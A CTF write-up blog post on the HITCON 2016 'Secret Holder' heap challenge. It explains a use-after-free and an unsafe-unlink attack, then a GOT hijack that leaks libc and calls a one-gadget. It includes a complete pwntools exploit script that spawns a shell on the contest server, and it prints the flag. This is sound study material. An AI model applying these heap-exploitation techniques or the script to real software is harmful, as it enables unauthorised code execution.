---
title: HITCON CTF 2016 Quals -- Secret Holder
layout: single
comments: true
share: true
related: true
author_profile: true
permalink: "/:title/"
tags:
- Python
- CTF
- Pwnable
- use_after_free
- heap
- HITCON
- heap_overflow
categories:
- write-ups
date: '2016-10-10 08:10:00 +0000'
---

**Category:** pwn
**Points:** 100

<!-- more -->  

I did not finish the challenge during the contest, but was able to solve it after the game. Damn if only I can fuzz some more...

64 bit ELF,  with Partial RELRO, canary & NX enabled, no PIE.  
Program allow us to:

* keep secret : new a secret ( using `calloc()` )
* wipe secret : delete a secret
* renew secret : edit a secret

There are three kinds of secret in the program: 

* `small` : secret with buffer size 40
* `big` : secret with buffer size 4,000
* `huge` : secret with buffer size 400,000

There's a Use-After-Free vulnerability in the `wipe` function:
```c
v0 = atoi(&s);
switch ( v0 )
{
    case 2:
        free(secret_buf_big);
        has_keep_big = 0;
        break;
    case 3:
        free(secret_buf_huge);
        has_keep_huge = 0;
        break;
    case 1:
        free(secret_buf_small);
        has_keep_small = 0;
        break;
}
```
When wiping a secret, it does not check the `has_keep_XXX` flag ( a flag that indicates now there's a small/big/huge secret in the program). So for example if we `keep(small)` --> `wipe(small)` --> `keep(big)` --> **`wipe(small)`**, it will free the `big` buffer, but we can still `renew(big)`

During the contest I did not know how to exploit the service. I successfully overlapped the `small` and the `big` buffer, but it only made me able to overwrite the top_size, which is useless since we can't control the size of the `calloc` function ( thus we can't do the [House of Force](https://github.com/shellphish/how2heap/blob/master/house_of_force.c) attack ). I was also failed to overlapped these two buffer with the different base address ( that is, I can only overlapped `small` & `big` with the same base heap address), so I was unable to overflow the heap buffer and overwrite the chunk header.  

After I asked the author of this challege, I realize that the key point of solving this challenge is to **exploit the `huge` and the `big`'s memory chunk**. 

While solving this challenge, I thought that if the malloc size was larger than `0x20000`, glibc will always use `mmap` to allocate the memory space. But I was wrong -- if we `keep(huge)`--> `wipe(huge)`--> `keep(huge)`, we will found that the second `huge` buffer was allocated by the `malloc` function, not `mmap` !! ( Thanks to the god damn `sysmalloc` !! )

So here's how we gonna exploit it:

* Use `keep` and `wipe` to make `small` & `huge` buffer be on the same heap address.
* `keep(big)` and make `big` buffer adjacent to the end of the `small` buffer.
* By doing `renew(huge)`, we'll be able to overflow the whole `big` buffer, thus we can create a fake **smallbin** memory chunk at the address of the `big` buffer.  
* By creating some fake chunks, we can use the [unsafe unlink](https://github.com/shellphish/how2heap/blob/master/unsafe_unlink.c) attack to overwrite `&huge_buf` ( all three buffer's address are store in the global data section ), so now the `huge`'s buffer will be lying on the global data section.
* Now we can overwrite all three buffer address ( data pointer ) by doing `renew(huge)`
* `renew(small/huge/big)` to overwrite the content of any address.  

After we overwrite the `huge`'s buffer address, we can try to do the GOT hijacking attack. But first we'll have to leak some address. The program itself did not output any of our input , so I decide to hijack  `free`'s GOT first. 

By overwriting `free`'s GOT into `puts@plt`, and `small`'s buffer into `__libc_start_main@got.plt`, we are able to leak the libc's address by doing `wipe(small)`, since it'll call `free(small)`, which is now `puts(_libc_start_main@got.plt)`.

After that we're able to overwrite some GOT and hijack the control flow. Here I overwrite `puts`'s GOT into the address of the [one-gadget](http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf), which will make the program spawn a shell whenever it tries to call `puts` to print out some message.  

```python
#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

HOST = "52.68.31.117"
PORT = 5566
ELF_PATH = "./secret_holder_noalarm"
LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"

# setting 
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

elf = ELF(ELF_PATH)
libc = ELF(LIBC_PATH)

def my_recvuntil(s, delim):
    res = ""
    while delim not in res:
        c = s.recv(1)
        res += c
        sys.stdout.write(c)
        sys.stdout.flush()
    return res

def myexec(cmd):
    return subprocess.check_output(cmd, shell=True)

def keep(ch, secret):
    r.sendlineafter("3. Renew secret\n", "1")
    r.sendlineafter("3. Huge secret\n", str(ch))
    r.sendafter("secret: \n", secret)

def wipe(ch):
    r.sendlineafter("3. Renew secret\n", "2")
    r.sendlineafter("3. Huge secret\n", str(ch))

def renew(ch, secret):
    r.sendlineafter("3. Renew secret\n", "3")
    r.sendlineafter("3. Huge secret\n", str(ch))
    r.sendafter("secret: \n", secret)

if __name__ == "__main__":

    r = remote(HOST, PORT)
    #r = process(ELF_PATH)
    keep(1, "A"*8)
    keep(2, "A"*8)
    keep(3, "A"*8)
    wipe(1)
    wipe(2)
    wipe(3)

    keep(3, "3"*8) # now huge chunk will use malloc, not mmap!!
    wipe(1)
    keep(1, "A"*8) # now huge = small
    keep(2, "2"*8) # big will adjacent to the end of the small buffer

    # 0x6020a8 stores the huge buffer's address
    fake_fd = 0x6020a8 - 0x18
    fake_bk = 0x6020a8 - 0x10

    # overwrite big's chunk data with fake chunk data for unsafe unlink
    payload = p64(0) + p64(0x21) # fake prev_chunk header
    payload += p64(fake_fd) + p64(fake_bk) # fake fd and bk
    payload += p64(0x20) + p64(0x90) # we are going to free here
    payload += "B"*0x80
    payload += p64(0x90) + p64(0x91) # fake next_chunk header
    payload += "C"*0x80
    payload += p64(0x90) + p64(0x91) # fake next_next_chunk header
    renew(3, payload)
    
    wipe(2) # free big, trigger unsafe unlink

    # now huge_buf will point to global data section
    # renew huge, overwrite small, big & huge buffer address
    payload = "A"*0x10
    payload += p64(0)
    payload += p64(0x6020b0) # &small_buf
    payload += p64(elf.got['free'])
    renew(3, payload)
    
    renew(1, p64(elf.plt['puts'])) # make free(buf) = puts(buf)
    
    # make small_buf = libc_start_main got
    # wipe(small) = puts(small) = puts(got) = leak address
    payload = p64(elf.got['__libc_start_main']) + p32(1)*3
    renew(3, payload)
    wipe(1)
    libc.address += u64(r.recvline().strip().ljust(8, "\x00")) - libc.symbols['__libc_start_main']
    one_gadget = libc.address + 0x4525a
    log.success("libc_base: "+hex(libc.address))
    log.success("one_gadget: "+hex(one_gadget))

    # hijack puts@got.plt, make it jump to one_gadget
    payload = p64(elf.got['puts']) + p32(1)*3
    renew(3, payload)
    renew(1, p64(one_gadget))

    r.interactive()


```

Such a shame that I didn't solve this challenge ...... I might be able to solve it if I did some more fuzzing.....

flag: `hitcon{The73 1s a s3C7e+ In malloc.c, h4ve y0u f0Und It?:P}`